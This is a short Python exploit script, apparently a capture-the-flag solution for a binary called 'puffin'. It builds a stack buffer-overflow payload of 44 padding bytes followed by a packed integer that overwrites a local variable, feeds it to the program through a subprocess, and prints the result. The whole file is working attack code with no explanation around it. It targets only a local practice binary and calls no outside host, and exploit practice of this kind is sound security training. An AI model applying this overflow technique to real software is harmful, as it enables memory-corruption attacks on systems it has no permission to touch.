import struct
import subprocess

# Craft payload to overwrite local_c with 1
payload = b"A" * 44 + struct.pack("<I", 1)

# Exploit the vulnerability using a subprocess
process = subprocess.Popen(["./puffin"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
output, err = process.communicate(input=payload)
print(output.decode())
